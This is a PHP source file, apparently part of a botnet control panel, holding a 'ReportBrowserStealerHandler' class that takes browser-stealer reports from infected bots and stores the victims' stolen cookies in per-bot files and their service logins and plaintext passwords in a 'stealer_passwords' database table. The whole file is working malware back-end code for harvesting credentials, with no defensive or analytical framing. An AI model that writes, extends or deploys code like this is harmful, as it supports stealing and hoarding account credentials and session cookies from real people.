<?php

require_once 'ReportHandler.php';
require_once 'application/modules/protobuf/pb_proto_protocol.php';

class ReportBrowserStealerHandler extends ReportHandler
{
    public function grabDataFromProtobuf($input_data, $botid)
    {
        try
        {
            $browsersData = new browsersData();
            $browsersData->ParseFromString($input_data);
            $this->data = $browsersData->getAssocArray();
            $this->data['bot_id'] = $this->getRowIdByBotId($botid);
        }
        catch (Exception $e)
        {
            Logger::Error('ReportBrowserStealerHandler', 'grabDataFromProtobuf (exception)', $e, null, null);
        }
    }

    public function grabDataFromJson($input_data, $botid)
    {
        try
        {
            $this->data = json_decode($input_data, true);
            $this->data['bot_id'] = $this->getRowIdByBotId($botid);
        }
        catch (Exception $e)
        {
            Logger::Error('ReportBrowserStealerHandler', 'grabDataFromJson (exception)', $e, null, null);
        }
    }

    public function storeDataToServer()
    {
        try
        {
            if ($this->dataIsEmpty())
            {
                return false;
            }

            $this->getDB()->beginTransaction();

            foreach ($this->data['browsers'] as $browser_data)
            {
                $browser = $browser_data['browser'];
                if (array_key_exists('cookies', $browser_data) && !empty($browser_data['cookies']))
                {
                    $cookies = $browser_data['cookies'];
                    $this->storeCookies($this->data['bot_id'], $browser, $cookies);
                }

                if (array_key_exists('accounts', $browser_data) && !empty($browser_data['accounts']))
                {
                    $accounts = $browser_data['accounts'];
                    $this->storePasswords($this->data['bot_id'], $browser, $accounts);
                }
            }
            $this->getDB()->commit();

        }
        catch (Exception $e)
        {
            $this->getDB()->rollBack();
            Logger::Error('ReportBrowserStealerHandler', 'storeDataToServer (exception)', $e, null, json_encode($this->data));
            return false;
        }
        return true;
    }

    private function storeCookies($botid, $browser, $cookies)
    {
        $output = '';
        foreach ($cookies as $cookie)
        {
            $output .= $cookie . "\n";
        }

        $filename = REPORTS_DIRECTORY . $botid . DIRECTORY_SEPARATOR . 'cookies' . DIRECTORY_SEPARATOR . $browser . DIRECTORY_SEPARATOR . 'report_' . date('Y-m-d__h-i-s') . '.txt';
        if (file_exists($filename))
        {
            $old_file_read = file_get_contents($filename);
            $test_data_hash = hash('md5', $output, FALSE);
            $test_file_hash = hash('md5', $old_file_read, FALSE);
            if ($test_data_hash != $test_file_hash) {
                unlink($filename);
                $file = fopen($filename, 'wb');
                fwrite($file, $output);
                fclose($file);
            }
        }
        else
        {
            if (!file_exists(dirname($filename)))
                if (!mkdir($concurrentDirectory = dirname($filename), 0777, true) && !is_dir($concurrentDirectory)) {
                    throw new \RuntimeException(sprintf('Directory "%s" was not created', $concurrentDirectory));
                }
            $file = fopen($filename, 'wb');
            fwrite($file, $output);
            fclose($file);
        }
    }

    private function storePasswords($botid, $browser, $accounts)
    {
        $old_logpasswords = $this->getDB()->queryRows('SELECT * FROM stealer_passwords WHERE bot_id = :bot_id AND browser = :browser ORDER BY id ASC',
            array(':bot_id' => $botid, ':browser' => $browser)); // ASC - для более быстрого поиска
        $new_logpasswords = $accounts;
        if (!count($old_logpasswords)) {
            $this->insertLogPass($botid, $browser, $new_logpasswords);
        } else {
            $will_update_lp = array();
            $will_insert_lp = array();
            $this->lpGenerateNewLists($new_logpasswords, $old_logpasswords, $will_update_lp, $will_insert_lp);
            if (count($will_update_lp)) {
                $this->updateLogPass($will_update_lp);
            }
            if (count($will_insert_lp)) {
                $this->insertLogPass($botid, $browser, $will_insert_lp);
            }
        }
    }

    private function insertLogPass($botid, $browser, &$lp_logs_new)
    {
        foreach($lp_logs_new as $index=>$lp_log) {
            $this->getDB()->insert('stealer_passwords', array(
                'bot_id' => $botid,
                'service' => $lp_log['service'],
                'login' => $lp_log['login'],
                'password' => $lp_log['password'],
                'browser' => $browser
            ));
        }
    }

    private function updateLogPass(&$lp_logs_new_pass)
    {
        foreach ($lp_logs_new_pass as $index=>$lp_log) {
            $this->getDB()->update('stealer_passwords', array('password' => $lp_log['password']), 'id=:id', array(':id' => $lp_log['id']));
        }
    }

    private function lpGenerateNewLists(&$new_list, &$old_list, &$will_update, &$will_insert)
    {
        foreach($new_list as $new_logpass) {
            list($old_logpass, $status) = $this->getActionForBean($old_list, $new_logpass);
            switch($status) {
                case 'without_changes':
                    break;
                case 'new_password':
                    $will_update[] = $old_logpass;
                    $will_update[count($will_update)-1]['password'] = $new_logpass['password'];
                    break;
                case 'new_account':
                    $will_insert[] = $new_logpass;
                    break;
            }
        }
    }

    private function getActionForBean(&$old_lp_list, &$new_logpass)
    {
        foreach ($old_lp_list as $old_logpass) {
            if ($new_logpass['service'] == $old_logpass['service']) {
                if ($new_logpass['login'] == $old_logpass['login'] && $new_logpass['login'] != "null") {
                    if ($new_logpass['password'] == $old_logpass['password']) { return array(null, 'without_changes'); }
                    if ($new_logpass['password'] != $old_logpass['password']) { return array($old_logpass, 'new_password'); }
                }
            }
        }
        return array(null, 'new_account');
    }

    protected function dataIsEmpty()
    {
        if (!empty($this->data['bot_id'])) {
            if (!empty($this->data['browsers']) && count($this->data['browsers']) > 0) {
                return false;
            }
        }
        return true;
    }
}